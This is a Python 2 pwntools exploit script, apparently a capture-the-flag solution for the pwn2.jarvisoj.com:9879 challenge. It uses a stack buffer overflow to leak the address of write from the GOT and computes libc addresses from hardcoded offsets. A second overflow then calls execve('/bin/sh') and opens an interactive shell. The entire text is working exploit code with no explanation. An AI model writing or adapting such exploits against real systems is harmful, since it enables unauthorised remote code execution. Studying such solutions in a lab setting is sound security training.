#!/usr/bin/env python2
from pwn import *

GOT_write_addr = 0x0804A018
call_write_addr = 0x08048460

conn = remote('pwn2.jarvisoj.com', 9879)

# leak addresses
print conn.read(),
conn.send_raw('A' * 0x88 + pack(GOT_write_addr + 0x88, 32) + 
              pack(call_write_addr, 32) + pack(1, 32) + pack(GOT_write_addr, 32) + pack(4, 32))
libc_write_addr = unpack(conn.read(4), 32)
libc_base_addr = libc_write_addr - 0x000DAFE0
libc_execve_addr = libc_base_addr + 0x000B5F40
libc_bin_sh_addr = libc_base_addr + 0x0016084C
log.info('libc_base_addr = 0x%08x' % libc_base_addr)
log.info('libc_write_addr = 0x%08x' % libc_write_addr)
log.info('libc_execve_addr = 0x%08x' % libc_execve_addr)
log.info('libc_bin_sh_addr = 0x%08x' % libc_bin_sh_addr)

# send exp buf
conn.send_raw(pack(libc_execve_addr, 32) + 'A' * (0x88 - 4) + 'fuck' + 
              pack(call_write_addr, 32) + pack(libc_bin_sh_addr, 32) + pack(0, 32) + pack(0, 32))

# get shell
conn.interactive()
